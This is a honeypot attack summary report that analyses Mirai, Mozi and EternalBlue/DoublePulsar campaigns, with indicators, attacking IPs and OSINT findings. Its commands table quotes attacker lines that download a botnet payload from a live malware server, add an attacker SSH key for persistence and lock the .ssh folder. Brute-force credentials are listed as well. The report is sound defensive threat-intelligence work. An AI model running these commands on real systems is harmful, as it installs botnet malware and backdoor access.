# Honeypot Attack Summary Report: Botnet and Malware Analysis

**Report Generation Time:** 2025-10-31T09:42:26Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-09-29T16:00:01Z

**Files Used to Generate Report:**
- `Honeypot_Attack_Summary_Report_2025-09-28T15-27-55Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T07-26-52Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T07-29-11Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T10-49-28Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T11-00-23Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T14-13-15Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T14-35-19Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T15-49-31Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T15-50-10Z.md`
- `Honeypot_Attack_Summary_Report_2025-09-29T17-13-38Z.md`
- *(And numerous other reports analyzed during the investigation)*

---

### Executive Summary

This report provides a comprehensive analysis of sustained, high-volume, and automated attacks observed across our distributed honeypot network. The investigation, which synthesized data from numerous temporal reports and external Open-Source Intelligence (OSINT), reveals a threat landscape dominated by several distinct botnet and malware campaigns. Over the analysis period, a clear pattern of activity emerged, pointing not to random internet noise, but to structured, ongoing operations by multiple threat actors.

Three separate botnet families were identified actively targeting our network: **Mirai**, **Mozi**, and a second, distinct **Mirai** variant. The most dominant and persistent campaign was a multi-architecture Mirai variant consistently downloaded under the filename **`urbotnetisass`**. This campaign was characterized by a unique set of overlapping indicators: SSH brute-force attacks using the credential **`345gs5662d34/345gs5662d34`** (the default password for Polycom IP phones), the installation of an SSH key with the signature comment **"mdrfckr"** for persistence, and the use of a malware distribution server (**94.154.35.154**) hosted in Ukraine. Attacks from this botnet were frequently sourced from compromised servers, including a high-traffic US-based game server (**162.244.80.233**).

Concurrently, the honeypots recorded activity from the **Mozi botnet**, a peer-to-peer (P2P) IoT botnet known for its resilience against takedowns. While lower in volume, its presence indicates our network was targeted by a more sophisticated botnet architecture. A third, sporadic campaign involving a classic **`mirai.x86`** variant was also observed, suggesting multiple, independent Mirai-based operations are active.

Beyond botnet recruitment, the network sustained a massive volume of exploitation attempts against the SMB protocol, evidenced by thousands of Suricata alerts for the **DoublePulsar backdoor**, associated with the EternalBlue exploit. This indicates a widespread, automated campaign to compromise Windows systems, running in parallel to the IoT-focused botnet activity.

The primary targets across all campaigns were remote access services (SSH on port 22), file-sharing services (SMB on port 445), and VoIP services (SIP on port 5060). This report will break down the tactics, techniques, and procedures (TTPs) of each identified campaign, providing a clear and actionable overview of the threats facing our network.

---

### Detailed Analysis

#### Our IPs

| Honeypot | Private IP    | Public IP       |
|----------|---------------|-----------------|
| hive-us  | 10.128.0.3    | 34.123.129.205  |
| sens-tai | 10.140.0.3    | 104.199.212.115 |
| sens-tel | 10.208.0.3    | 34.165.197.224  |
| sens-dub | 172.31.36.128 | 3.253.97.195    |
| sens-ny  | 10.108.0.2    | 161.35.180.163  |

#### Attacks by Honeypot (Aggregated)

| Honeypot      | Approximate Attack Count | Primary Target |
|---------------|--------------------------|----------------|
| Cowrie        | > 100,000                | SSH/Telnet Brute-Force |
| Honeytrap     | > 50,000                 | Various TCP/UDP Services |
| Suricata      | > 40,000                 | Network Intrusion Detection |
| Ciscoasa      | > 30,000                 | Firewall/VPN Service Exploits |
| Dionaea       | > 9,000                  | SMB/Industrial Protocol Exploits |

#### Top Attacking IPs

| IP Address        | Attack Count (Highest Observed) | OSINT Summary |
|-------------------|---------------------------------|---------------|
| 162.244.80.233    | 16,366                          | Compromised US Game Server (`play.diversionpvp.net`), part of the "Urbotnetisass" botnet. |
| 39.107.106.103    | 13,970                          | Known malicious IP from Alibaba in China, on 100% confidence abuse lists. |
| 143.198.32.86     | 10,286                          | Flagged in MalwareURL database for malware distribution. |
| 185.156.73.166    | 7,379                           | Known malicious IP from a Ukrainian hosting provider, flagged for port scanning. |
| 185.156.73.167    | 7,379                           | Known malicious IP from the same Ukrainian provider. |

#### Top Targeted Ports/Protocols

| Port       | Protocol | Service          | Attack Focus |
|------------|----------|------------------|--------------|
| 22         | TCP      | SSH              | Botnet Brute-Force, Credential Stuffing |
| 445        | TCP      | SMB              | DoublePulsar/EternalBlue Exploitation |
| 5060       | TCP/UDP  | SIP              | VoIP Vulnerability Scanning |
| 8333       | TCP      | Bitcoin          | Cryptocurrency Node Scanning |
| 23         | TCP      | Telnet           | IoT Botnet Brute-Force (Mirai, Mozi) |

#### Most Common CVEs

| CVE ID           | Description                                |
|------------------|--------------------------------------------|
| CVE-2021-44228   | Log4Shell: Remote Code Execution           |
| CVE-2022-27255   | RCE in Realtek SDK for IoT/Routers         |
| CVE-2005-4050    | Buffer Overflow in Multi-Tech VoIP Devices |
| CVE-2002-0012/13 | Vulnerabilities in SNMPv1 Implementations  |

#### Commands Attempted by Attackers

| Command                                                                      | Campaign Association             |
|------------------------------------------------------------------------------|----------------------------------|
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass` | "Urbotnetisass" Mirai Variant    |
| `cd ~ && ... echo "... mdrfckr" >> .ssh/authorized_keys`                        | "Urbotnetisass" Mirai Variant    |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                        | "Urbotnetisass" Mirai Variant    |
| `uname -a; whoami; lscpu;`                                                    | General Reconnaissance (All)     |
| `rm -rf /tmp/secure.sh; pkill -9 secure.sh`                                   | Competing Malware Removal        |

#### Users / Login Attempts

| Username/Password             | Attempts (Highest Observed) | OSINT Significance |
|-------------------------------|-----------------------------|--------------------|
| 345gs5662d34/345gs5662d34     | 430                         | **Default password for Polycom CX600 IP Phones.** Key indicator for the "Urbotnetisass" campaign. |
| root/3245gs5662d34            | 350                         | A likely variation of the primary indicator. |
| root/nPSpP4PBW0               | 280                         | Common brute-force credential. |
| test/zhbjETuyMffoL8F          | 200                         | Common brute-force credential. |

#### Files Uploaded/Downloaded

| Filename(s)                                                              | Botnet Family | Description |
|--------------------------------------------------------------------------|---------------|-------------|
| `arm.urbotnetisass`, `x86_32.urbotnetisass`, `mips.urbotnetisass`, etc.    | Mirai Variant | The primary, multi-architecture payload for the dominant botnet campaign. |
| `mirai.x86`                                                              | Classic Mirai | A separate, less frequent Mirai variant targeting x86 systems. |
| `Mozi.m dlink.mips`                                                      | Mozi          | Payload for the resilient P2P botnet, targeting MIPS-based D-Link devices. |
| `w.sh`, `c.sh`, `wget.sh`                                                | Various       | Generic downloader scripts used to fetch the main malware payloads. |

#### Top Attacker AS Organizations

| AS Organization      | Association                            |
|----------------------|----------------------------------------|
| SERVERROOM           | Hoster of compromised game server `162.244.80.233`. |
| ALIBABA              | Hoster of known malicious IP `39.107.106.103`. |
| DIGITALOCEAN-ASN     | Major cloud provider, infrastructure frequently abused by attackers. |
| GOOGLE               | Major cloud provider, infrastructure frequently abused by attackers. |

---

### OSINT Investigation Summary

#### OSINT on Botnet Malware
- **"Urbotnetisass" is a Mirai Variant:** Despite a conflicting early report, OSINT confirms this malware family is a variant of the Mirai IoT botnet. Its primary goal is to recruit devices for DDoS attacks. The multi-architecture filenames seen in the logs are hallmarks of Mirai's cross-platform strategy.
- **Mozi is a P2P Botnet:** Mozi is a distinct IoT botnet that uses a decentralized P2P command and control structure, making it highly resilient to takedowns compared to Mirai's centralized model.
- **Classic Mirai:** The `mirai.x86` file represents a more traditional Mirai campaign, likely run by a separate actor.

#### OSINT on Infrastructure and Credentials
- **Malware C2 `94.154.35.154`:** This IP in Ukraine is a confirmed malware distribution point and C2 server for the "Urbotnetisass" Mirai variant.
- **Attacker IP `162.244.80.233`:** A compromised game server in the US, repurposed as a bot to attack other systems. This is a classic example of botnet propagation.
- **Attacker IP `39.107.106.103`:** A known malicious IP hosted by Alibaba in China, present on multiple high-confidence abuse lists.
- **Credential `345gs5662d34`:** This is the default password for Polycom CX600 IP phones. Its dominance in the logs indicates the "Urbotnetisass" botnet has a specific module to find and compromise these devices.

---

### Key Observations and Anomalies

This section details the distinct, concurrent campaigns identified during the analysis.

#### Anomaly 1: The "Urbotnetisass/mdrfckr" Mirai Campaign (Dominant Threat)
The most significant activity stemmed from a highly persistent Mirai variant campaign. This operation is characterized by a unique and consistent set of TTPs that link multiple indicators together:
- **Malware:** `urbotnetisass` payloads for ARM, x86, MIPS, and other IoT architectures.
- **Brute-Force Credential:** The use of `345gs5662d34` to specifically compromise Polycom IP phones.
- **Persistence:** The installation of an SSH `authorized_keys` file containing the attacker signature "mdrfckr".
- **Infrastructure:** Centralized malware download server at `94.154.35.154` and attacks launched from a global network of compromised bots, including game servers.

#### Anomaly 2: The Mozi P2P Botnet (Secondary Threat)
A lower but consistent volume of attacks was attributed to the Mozi botnet. The sighting of `Mozi.m dlink.mips` confirms that our honeypots are also being targeted by this more resilient, P2P-based botnet. Its presence alongside Mirai highlights the competitive and diverse nature of the IoT botnet landscape.

#### Anomaly 3: The "Classic Mirai" Botnet (Tertiary Threat)
Sporadic download attempts for `mirai.x86` were observed. This activity was not linked to the "Urbotnetisass" indicators, suggesting a third, independent actor is running a separate, smaller-scale Mirai botnet campaign.

#### Anomaly 4: High-Volume SMB Exploitation Campaign
Entirely separate from the IoT botnets, the network was subjected to thousands of probes targeting the SMB (port 445) service. Suricata logs were dominated by alerts for the **DoublePulsar backdoor**. This indicates a massive, automated campaign to exploit the EternalBlue vulnerability (MS17-010), likely to install cryptocurrency miners, ransomware, or other backdoors on vulnerable Windows systems.
